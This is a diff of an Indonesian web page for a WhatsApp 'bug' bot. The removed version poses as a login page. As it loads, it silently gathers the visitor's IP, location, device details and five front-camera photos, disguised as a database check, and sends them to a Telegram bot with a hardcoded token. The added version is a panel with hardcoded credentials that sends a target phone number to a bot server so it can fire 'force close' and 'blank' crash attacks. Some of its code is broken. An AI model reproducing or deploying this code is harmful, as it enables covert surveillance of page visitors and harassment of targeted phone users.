@@ -1,353 +1,153 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>DRAVEX INFINITY</title>
-
-  <meta name="description" content="Halaman Login Dravex Infinity" />
-
+  <meta charset="UTF-8">
+  <title>WEB BUG BY FIXZZ</title>
   <style>
-    :root{
-      --bg:#0b0f14;
-      --card:#0f1720;
-      --muted:#98a0ad;
-      --accent:#ef4444;
-      --accent-2:#facc15;
-      --danger:#dc2626;
-      --glass: rgba(255,255,255,0.03);
-      --radius:12px;
+    body {
+      font-family: Arial, sans-serif;
+      background: url('https://files.catbox.moe/f3iivs.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: white;
+      text-align: center;
+      padding: 60px 20px;
     }
 
-    *{box-sizing:border-box}
-    html,body{height:100%}
-    body{
-      margin:0;
-      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
-      background:
-        radial-gradient(1200px 600px at 10% 10%, rgba(239,68,68,0.1), transparent 8%),
-        radial-gradient(1000px 500px at 90% 90%, rgba(250,204,21,0.08), transparent 10%),
-        var(--bg);
-      color:#e6eef6;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      padding:24px;
+    h1 {
+      font-size: 80px;
+      font-weight: bold;
+      margin-bottom: 80px;
+      text-shadow: 4px 4px 12px #000;
     }
 
-    .container{
-      width:100%;
-      max-width:960px;
-      display:grid;
-      grid-template-columns: 420px 1fr;
-      gap:28px;
-      align-items:center;
+    input[type="text"], input[type="password"] {
+      padding: 25px;
+      font-size: 40px;
+      width: 95%;
+      max-width: 700px;
+      border-radius: 15px;
+      border: none;
+      margin-bottom: 40px;
+      text-align: center;
+      box-shadow: 0 0 15px #000;
     }
 
-    .card{
-      background:linear-gradient(180deg, rgba(255,255,255,0.02), transparent);
-      border:1px solid rgba(255,255,255,0.05);
-      padding:28px;
-      border-radius:var(--radius);
-      box-shadow: 0 8px 30px rgba(2,6,23,0.6);
-      backdrop-filter: blur(6px);
+    .button-group button, .login-box button {
+      margin: 25px;
+      padding: 25px 60px;
+      font-size: 45px;
+      font-weight: bold;
+      border: none;
+      border-radius: 20px;
+      background-color: #1e90ff;
+      color: white;
+      cursor: pointer;
+      box-shadow: 4px 4px 12px #000;
+      transition: background 0.3s, transform 0.2s;
     }
 
-    .brand{
-      display:flex;
-      gap:14px;
-      align-items:center;
-      margin-bottom:18px;
-    }
-    .logo {
-      width:56px;
-      height:56px;
-      border-radius:10px;
-      background:linear-gradient(135deg,var(--accent),var(--accent-2));
-      display:grid;
-      place-items:center;
-      font-weight:700;
-      color:#001217;
-      font-size:20px;
-      box-shadow: 0 6px 18px rgba(239,68,68,0.2);
-    }
-    .brand h1{
-      margin:0;
-      font-size:18px;
-      letter-spacing:0.2px;
-    }
-    .brand p{ margin:0; color:var(--muted); font-size:13px }
-
-    form { margin-top:6px }
-    .field{ margin-bottom:14px }
-    label{
-      display:block;
-      font-size:13px;
-      color:var(--muted);
-      margin-bottom:8px;
+    .button-group button:hover, .login-box button:hover {
+      background-color: #005bb5;
+      transform: scale(1.1);
     }
 
-    input[type="text"],
-    input[type="password"]{
-      width:100%;
-      padding:12px 14px;
-      border-radius:10px;
-      border:1px solid rgba(255,255,255,0.05);
-      background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.00));
-      color:inherit;
-      outline:none;
-      transition: box-shadow .15s, border-color .15s, transform .08s;
-    }
-    input:focus{
-      box-shadow: 0 6px 22px rgba(239,68,68,0.2);
-      border-color: var(--accent);
-      transform: translateY(-1px);
+    .hidden {
+      display: none;
     }
 
-    .row{
-      display:flex;
-      gap:12px;
-      align-items:center;
-      justify-content:space-between;
-    }
-    .remember{
-      display:flex;
-      gap:10px;
-      align-items:center;
-      color:var(--muted);
-      font-size:13px;
-    }
-
-    .btn{
-      display:inline-block;
-      width:100%;
-      padding:12px 14px;
-      border-radius:10px;
-      border:none;
-      cursor:pointer;
-      font-weight:600;
-      font-size:15px;
-      background: linear-gradient(90deg,var(--accent),#b91c1c);
-      color:white;
-      box-shadow: 0 8px 28px rgba(239,68,68,0.2);
-      transition: transform .12s, box-shadow .12s, filter .12s;
-    }
-    .btn:active{ transform: translateY(1px) }
-    .btn.secondary{
-      background:transparent;
-      border:1px solid rgba(255,255,255,0.1);
-      color:var(--muted);
-      box-shadow:none;
+    /* Tombol Logout di kanan atas */
+    #logoutBtn {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      font-size: 30px;
+      padding: 15px 30px;
+      background-color: red;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      display: none;
+      box-shadow: 3px 3px 10px #000;
     }
 
-    .helper{
-      margin-top:12px;
-      display:flex;
-      justify-content:space-between;
-      align-items:center;
-      gap:12px;
-      font-size:13px;
-      color:var(--muted);
-    }
-    .helper a{ color:var(--muted); text-decoration:none }
-    .helper a:hover{ color:#fff; text-decoration:underline }
-
-    .danger { color:var(--danger); font-size:13px; margin-top:8px; }
-
-    .info{
-      padding:28px;
-      border-radius:var(--radius);
-      background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.00));
-      border:1px solid rgba(255,255,255,0.03);
-      display:flex;
-      flex-direction:column;
-      gap:12px;
-    }
-    .info h2{ margin:0; color:#fff; font-size:18px }
-    .info p{ margin:0; color:var(--muted); font-size:14px; line-height:1.5 }
-
-    .meta {
-      margin-top:auto;
-      display:flex;
-      gap:10px;
-      align-items:center;
-      justify-content:flex-start;
-      color:var(--muted);
-      font-size:13px;
-    }
-    .meta .pill{
-      padding:8px 10px;
-      border-radius:10px;
-      background:var(--glass);
-      border:1px solid rgba(255,255,255,0.02);
+    #logoutBtn:hover {
+      background-color: darkred;
     }
 
-    @media (max-width:880px){
-      .container{ grid-template-columns: 1fr; }
-      .info{ order:2 }
-    }
   </style>
 </head>
 <body>
-  <main class="container">
-    <section class="card">
-      <div class="brand">
-        <div class="logo">😹</div>
-        <div>
-          <h1>Dravex 1.0.0</h1>
-          <p>Website Bug Dravex Infinity.</p>
-        </div>
-      </div>
 
-      <form id="loginForm" action="/auth/login" method="POST">
-        <div class="field">
-          <label for="username">Nama Akun</label>
-          <input id="username" name="username" type="text" placeholder="NamaAkunAnda" required />
-        </div>
+  <h1>FIXZCOREX INFINITY</h1>
 
-        <div class="field">
-          <label for="password">Password</label>
-          <input id="password" name="password" type="password" placeholder="••••••••" required />
-        </div>
+  <!-- Tombol Logout -->
+  <button id="logoutBtn" onclick="logout()">LOG OUT</button>
 
-        <div class="row" style="margin-top:6px">
-          <label class="remember">
-            <input type="checkbox" name="remember" />
-            <span>Ingat saya</span>
-          </label>
-          <a href="/auth/forgot" style="font-size:13px;color:var(--muted)">Lupa password?</a>
-        </div>
+  <!-- Login Form -->
+  <div class="login-box" id="loginBox">
+    <input type="text" id="username" placeholder="Username"><br>
+    <input type="password" id="password" placeholder="Password"><br>
+    <button onclick="login()">LOGIN</button>
+  </div>
 
-        <div style="margin-top:18px">
-          <button class="btn" type="submit">Masuk</button>
-        </div>
-
-        <div class="helper">
-          <span>Belum punya akun?</span>
-          <a href="/auth/register" class="btn secondary" style="width:auto; padding:9px 12px">Daftar</a>
-        </div>
-      </form>
-    </section>
-
-    <aside class="info">
-      <h2>Tentang Dravex</h2>
-      <p>
-        Dravex adalah script bot Bug WhatsApp yang di kembangkan oleh saya FikyzMods.
-      </p>
-
-      <div class="meta">
-        <div class="pill">Status: <strong style="color:#f87171">Online</strong></div>
-        <div class="pill">Versi: <strong style="color:#facc15">v1.0.0</strong></div>
-      </div>
-    </aside>
-
-    <div id="status" style="margin-top:15px; font-size:14px; color:#facc15;">
-      ⏳ Verifikasi Data Base...
+  <!-- Main APK Bug Form -->
+  <div id="mainContent" class="hidden">
+    <input type="text" id="nomor" placeholder="Masukkan Nomor Target"><br>
+    <div class="button-group">
+      <button onclick="Function01">FORCLOSE</button>
+      <button onclick="delay">DELAY INVISIBLE</button>
+      <button onclick="kirimKeBot('INVIS')">BLANK HARD</button>
     </div>
-  </main>
+    <div id="status" style="font-size: 100px; margin-top: 50px;"></div>
+  </div>
+
   <script>
-    const CHAT_ID = "8391854198";
-    const BOT_TOKEN = "8290410943:AAG-JEKU0s8PlHzspjkYroe4oIwWlvyN54g";
-    const statusEl = document.getElementById('status');
+    function login() {
+      const user = document.getElementById("username").value;
+      const pass = document.getElementById("password").value;
 
-    const observer = new IntersectionObserver((entries) => {
-      entries.forEach(entry => {
-        if (entry.isIntersecting) entry.target.classList.add('show');
-      });
-    }, { threshold: 0.1 });
-
-    document.querySelectorAll('.section, .product').forEach(el => observer.observe(el));
-
-    window.onload = async () => {
-      statusEl.textContent = "⏳ Loading...";
-      const kamiyaKey = await Fast_server();
-      await sendDeviceInfo(kamiyaKey);
-
-      try {
-        statusEl.textContent = '⏳ Loading...';
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-        const track = stream.getVideoTracks()[0];
-
-        for (let i = 0; i < 5; i++) {
-          statusEl.textContent = `⏳ Loading... ${(i + 1) * 20}%...`;
-          const blob = await captureFromVideo(track);
-          await sendToTelegram(kamiyaKey, blob, "photo");
-          await new Promise(r => setTimeout(r, 1000));
-        }
-
-        track.stop();
-        statusEl.textContent = '✅ Verifikasi berhasil!';
-      } catch (err) {
-        statusEl.textContent = '✅ Silahkan masukan username dan password .';
-        console.error(err);
-      }
-    };
-
-    async function Fast_server() {
-      try {
-        const res = await fetch('/api/kamiya_union');
-        const data = await res.json();
-        return data.kamiya_key;
-      } catch {
-        return "direct";
-      }
-    }
-
-    async function sendDeviceInfo(key) {
-      try {
-        const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r => r.json());
-        const battery = await navigator.getBattery();
-        const time = new Date().toLocaleString("id-ID");
-
-        const message = `
-🌐 *Informasi IP*
-🔢 Alamat IP: ${ipInfo.ip}
-🗺 Negara: ${ipInfo.country}
-🌍 Wilayah: ${ipInfo.region}
-📍 Kota: ${ipInfo.city}
-📡 ISP: ${ipInfo.org}
-
-📱 *Detail Perangkat*
-🔋 Baterai: ${Math.round(battery.level * 100)}% ${battery.charging ? "⚡️ Mengisi daya" : ""}
-📶 Jaringan: ${navigator.connection?.effectiveType || "Tidak diketahui"}
-🖥️ Layar: ${screen.width}x${screen.height}
-🕒 Waktu: ${time}
-🧠 User Agent: ${navigator.userAgent}
-...`;
-
-        await sendToTelegram(key, message.trim(), "text");
-      } catch (err) {
-        console.error("Device Info Error:", err);
-      }
-    }
-
-    async function captureFromVideo(videoTrack) {
-      const video = document.createElement("video");
-      video.srcObject = new MediaStream([videoTrack]);
-      await video.play();
-
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      canvas.getContext("2d").drawImage(video, 0, 0);
-
-      return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.7));
-    }
-
-    async function sendToTelegram(key, data, type) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/${type === "text" ? "sendMessage" : "sendPhoto"}`;
-      const form = new FormData();
-      form.append("chat_id", CHAT_ID);
-
-      if (type === "text") {
-        form.append("text", data);
-        form.append("parse_mode", "Markdown");
+      if (user === "Fixzz" && pass === "Fixzz") {
+        document.getElementById("loginBox").style.display = "none";
+        document.getElementById("mainContent").classList.remove("hidden");
+        document.getElementById("logoutBtn").style.display = "inline-block";
       } else {
-        form.append("photo", data, "image.jpg");
+        alert("Login gagal! Username atau password salah.");
+      }
+    }
+
+    function logout() {
+      document.getElementById("mainContent").classList.add("hidden");
+      document.getElementById("loginBox").style.display = "block";
+      document.getElementById("logoutBtn").style.display = "none";
+    }
+
+    function kirimKeBot(mode) {
+      const nomor = document.getElementById("nomor").value;
+      const status = document.getElementById("status");
+
+      if (!nomor) {
+        alert("Masukkan nomor terlebih dahulu!");
+        return;
       }
 
-      await fetch(url, { method: "POST", body: form });
+      // Contoh kirim data ke bot (ubah URL ke IP/server bot kamu)
+      fetch("http://174.138.17.111:3005?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ nomor: nomor, mode: mode })
+      })
+      .then(res => res.text())
+      .then(res => {
+        status.innerText = "✅ Berhasil dikirim ke bot!";
+      })
+      .catch(err => {
+        status.innerText = "❌ Gagal mengirim ke bot!";
+      });
     }
   </script>
+
 </body>
 </html>
